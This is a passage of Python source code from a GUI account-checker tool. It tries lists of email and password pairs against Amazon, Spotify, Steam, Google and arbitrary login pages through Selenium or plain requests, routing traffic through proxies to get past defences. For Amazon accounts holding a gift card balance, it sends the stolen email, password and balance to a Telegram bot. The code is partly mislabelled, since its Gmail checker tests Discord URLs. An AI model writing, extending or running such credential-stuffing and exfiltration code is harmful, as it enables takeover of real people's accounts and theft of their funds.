            continue_button = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'a-button-input')))
            continue_button.click()
            
            password_input = wait.until(EC.element_to_be_clickable((By.ID, 'ap_password')))
            password_input.clear()
            password_input.send_keys(password)
            
            login_button = wait.until(EC.element_to_be_clickable((By.ID, 'signInSubmit')))
            login_button.click()
            
            wait.until(lambda d: 'homepage.htm' in d.current_url)
            driver.get('https://www.amazon.com/gp/css/gc/balance?ref_=ya_d_c_gc')
            element = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.ID, "gc-ui-balance-gc-balance-value")))

            giftcard_balance = element.text.strip()  # Gets visible text and removes whitespace
            time.sleep(3)

            driver.get('https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo')

            credit_elements = driver.find_elements(By.CLASS_NAME, 'card-num')
            credit_count = len(credit_elements)
            details_str = f'Gift Card Balance : {giftcard_balance}'

            
            
            if giftcard_balance > 0:
                
                requests.get(
                    f'https://api.telegram.org/bot{token}/sendMessage',
                    params={
                        'chat_id': chat_id,
                        'text': f'midasbuy:\n{email}:{password}|{details_str}'
                    }
                )
            
            return True, details_str
        except Exception as e:
            print(f'Error in Midasbuy Selenium login: {e}')
            return False, {}
    
    def check_spotify_selenium(self, driver, email, password):
        """Spotify account checker using Selenium"""
        try:
            wait = WebDriverWait(driver, 15)
            driver.get('https://accounts.spotify.com/en/login')
            
            email_input = wait.until(EC.element_to_be_clickable((By.ID, 'login-username')))
            email_input.clear()
            email_input.send_keys(email)
            Continue_button = driver.find_element(By.ID, 'login-button')
            Continue_button.click()
            
            password_input = driver.find_element(By.ID, 'login-password')
            password_input.clear()
            password_input.send_keys(password)
            
            login_button = driver.find_element(By.ID, 'login-button')
            login_button.click()
            
            time.sleep(3)
            
            # Check if login was successful
            if 'overview' in driver.current_url or 'account' in driver.current_url:
                return True, "Spotify Valid"
            else:
                return False, {}
        except Exception as e:
            return False, {}
    
    def check_steam_selenium(self, driver, email, password):
        """Steam account checker using Selenium"""
        try:
            wait = WebDriverWait(driver, 15)
            driver.get('https://store.steampowered.com/login/')
            
            email_input = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[type="text"]')))
            email_input.clear()
            email_input.send_keys(email)
            
            password_input = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
            password_input.clear()
            password_input.send_keys(password)
            
            login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
            login_button.click()
            
            time.sleep(5)
            
            # Check if login was successful (Steam has complex 2FA, so this is basic)
            current_url = driver.current_url
            if 'store.steampowered.com' in current_url and 'login' not in current_url:
                return True, "Steam Valid"
            else:
                return False, {}
        except Exception as e:
            return False, {}
    
    def check_gmail_selenium(self, driver, email, password):
        """Discord account checker using Selenium"""
        try:
            wait = WebDriverWait(driver, 15)
            driver.get('https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=AdBytiOT3zeEE1PzCaSmRfmvv5f4usIQ_tufYbNGrIWe-CLCd1PgGpoyhpLbgvJP_tyisP3AJwjZiA&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S922777728%3A1755868084345329')
            
            email_input = wait.until(EC.element_to_be_clickable((By.ID, 'identifierId')))
            email_input.clear()
            email_input.send_keys(email)
            
            con_button = driver.find_element(By.CLASS_NAME, 'VfPpkd-RLmnJb')
            con_button.click()
            password_input = driver.find_element(By.NAME, 'Passwd')
            password_input.clear()
            password_input.send_keys(password)
            
            con_button = driver.find_element(By.CLASS_NAME, 'VfPpkd-RLmnJb')
            con_button.click()


            #Couldn’t find your Google Account
            
            time.sleep(3)
            
            # Check if login was successful
            if 'channels' in driver.current_url or 'app' in driver.current_url:
                return True, "Discord Valid"
            else:
                return False, {}
        except Exception as e:
            return False, {}
    
    def check_generic_selenium(self, driver, email, password, site_config):
        """Generic selenium checker for unsupported sites"""
        try:
            driver.get(site_config["login_url"])
            time.sleep(2)
            
            # Try common email/username field selectors
            email_selectors = ['input[type="email"]', 'input[name="email"]', 'input[name="username"]', '#email', '#username']
            password_selectors = ['input[type="password"]', 'input[name="password"]', '#password']
            
            email_input = None
            for selector in email_selectors:
                try:
                    email_input = driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            password_input = None
            for selector in password_selectors:
                try:
                    password_input = driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if email_input and password_input:
                email_input.clear()
                email_input.send_keys(email)
                password_input.clear()
                password_input.send_keys(password)
                
                # Try to find submit button
                submit_selectors = ['button[type="submit"]', 'input[type="submit"]', '.login-button', '#login-button']
                for selector in submit_selectors:
                    try:
                        submit_button = driver.find_element(By.CSS_SELECTOR, selector)
                        submit_button.click()
                        break
                    except:
                        continue
                
                time.sleep(3)
                
                # Basic check - if URL changed or no error message, assume success
                if driver.current_url != site_config["login_url"]:
                    return True, f"{site_config['name']} Valid"
            
            return False, {}
        except Exception as e:
            return False, {}
    
    def check_generic_requests(self, email, password, site_config, proxy):
        """Generic requests checker"""
        try:
            session = requests.Session()
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
            
            # Basic POST request to login URL
            response = session.post(site_config["login_url"], data={
                'email': email,
                'password': password,
                'username': email  # Some sites use username instead
            }, timeout=10)
            
            # Basic success detection - this would need site-specific implementation
            if response.status_code == 200 and 'error' not in response.text.lower():
                return True, f"{site_config['name']} Valid (Requests)"
            
            return False, {}
        except Exception as e:
            return False, {}
    
    def save_results(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(self.results_text.get("1.0", "end"))
                self.status_label.configure(text=f"Results saved to {os.path.basename(file_path)}")
            except Exception as e:
                self.status_label.configure(text=f"Error saving results: {str(e)}", text_color="#ff0000")
    
    def clear_results(self):
        self.results_text.delete("1.0", "end")
        self.status_label.configure(text="Results cleared")

if __name__ == "__main__":
    app = ModernChecker()
    app.mainloop()
